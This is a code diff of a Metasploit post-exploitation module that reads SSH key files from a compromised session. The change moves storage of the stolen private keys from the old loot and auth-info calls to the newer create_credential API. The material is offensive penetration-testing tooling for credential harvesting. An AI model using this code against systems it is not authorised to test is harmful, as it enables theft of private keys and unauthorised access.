@@ -60,29 +60,27 @@ class Metasploit3 < Msf::Post
         next if [".", ".."].include?(file)
         data = read_file("#{path}#{sep}#{file}")
         file = file.split(sep).last
-        loot_path = store_loot("ssh.#{file}", "text/plain", session, data,
-          "ssh_#{file}", "OpenSSH #{file} File")
-        print_good("Downloaded #{path}#{sep}#{file} -> #{loot_path}")
 
-        # If the key is encrypted, this will fail and it won't be stored as a
-        # cred.  That's ok because we can't really use encrypted keys anyway.
-        key = SSHKey.new(data, :passphrase => "") rescue nil
-        if key and loot_path
-          print_status("Saving private key #{file} as cred")
-          cred_hash = {
-            :host => session.session_host,
-            :port => 22,
-            :sname => 'ssh',
-            :user => user,
-            :pass => loot_path,
-            :source_type => "exploit",
-            :type => 'ssh_key',
-            :proof => "KEY=#{key.fingerprint}",
-            :duplicate_ok => true,
-            :active => true
+        print_good("Downloaded #{path}#{sep}#{file}")
+
+        begin
+          key = SSHKey.new(data, :passphrase => "")
+
+          credential_data = {
+            origin_type: :session,
+            session_id: session_db_id,
+            post_reference_name: self.refname,
+            private_type: :ssh_key,
+            private_data: key.key_object.to_s,
+            username: user,
+            workspace_id: myworkspace_id
           }
-          report_auth_info(cred_hash)
+
+          create_credential(credential_data)
+        rescue OpenSSL::OpenSSLError => e
+          print_error("Could not load SSH Key: #{e.message}")
         end
+
       end
 
     end
